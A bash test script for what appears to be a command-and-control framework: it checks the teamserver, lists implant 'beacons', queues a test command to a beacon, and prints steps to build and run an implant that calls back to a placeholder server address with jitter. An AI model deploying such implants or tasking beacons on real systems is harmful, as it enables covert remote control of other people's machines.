#!/bin/bash
#
# Test Connection Script
# Verifies that implant can connect to teamserver
#

set -e

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

print_success() {
    echo -e "${GREEN}✓${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

print_info() {
    echo -e "${YELLOW}→${NC} $1"
}

print_header() {
    echo ""
    echo "=================================="
    echo "$1"
    echo "=================================="
    echo ""
}

# Check if services are running
check_services() {
    print_header "Checking Services"

    if docker-compose ps | grep -q "c2_teamserver.*Up"; then
        print_success "Teamserver is running"
    else
        print_error "Teamserver is not running"
        echo "Run: docker-compose up -d"
        exit 1
    fi

    if docker-compose ps | grep -q "c2_database.*Up"; then
        print_success "Database is running"
    else
        print_error "Database is not running"
        exit 1
    fi
}

# Test teamserver connectivity
test_teamserver() {
    print_header "Testing Teamserver Connectivity"

    print_info "Testing HTTPS endpoint..."

    if curl -k -s -o /dev/null -w "%{http_code}" https://localhost:8443/health | grep -q "200\|404"; then
        print_success "Teamserver is accessible on port 8443"
    else
        print_error "Cannot connect to teamserver on port 8443"
        print_info "Check teamserver logs: docker-compose logs teamserver"
        exit 1
    fi
}

# List beacons
list_beacons() {
    print_header "Listing Active Beacons"

    print_info "Querying for active beacons..."
    docker-compose exec -T controller python main.py beacons

    BEACON_COUNT=$(docker-compose exec -T controller python main.py beacons 2>/dev/null | grep -c "beacon-" || echo "0")

    if [ "$BEACON_COUNT" -gt "0" ]; then
        print_success "Found $BEACON_COUNT active beacon(s)"
    else
        print_info "No active beacons found"
        echo ""
        echo "To connect an implant:"
        echo "  1. Build: cd ../../implant && go build -o implant main.go"
        echo "  2. Run: ./implant --server https://YOUR_IP:8443 --interval 60 --jitter 30 --insecure"
        echo "  3. Wait up to 90 seconds for check-in"
        echo "  4. Run this script again"
    fi
}

# Test command execution (if beacons exist)
test_command() {
    print_header "Testing Command Execution"

    # Get first beacon ID
    BEACON_ID=$(docker-compose exec -T controller python main.py beacons 2>/dev/null | grep "beacon-" | head -1 | awk '{print $1}' || echo "")

    if [ -z "$BEACON_ID" ]; then
        print_info "Skipping command test (no beacons)"
        return
    fi

    print_info "Testing with beacon: $BEACON_ID"

    # Submit test command
    print_info "Submitting test command..."
    docker-compose exec -T controller python main.py exec "$BEACON_ID" "echo 'Connection test successful'" > /dev/null

    print_success "Command submitted"
    print_info "Wait for beacon check-in interval, then run:"
    echo "  docker-compose exec controller python main.py output $BEACON_ID"
}

# View logs
show_logs() {
    print_header "Recent Teamserver Logs"

    print_info "Last 20 lines of teamserver logs:"
    docker-compose logs --tail=20 teamserver
}

# Main
main() {
    print_header "Connection Test"

    # Navigate to project root
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
    cd "$PROJECT_ROOT"

    check_services
    test_teamserver
    list_beacons
    test_command
    show_logs

    print_header "Test Complete"
    print_success "All connectivity tests passed!"
}

main
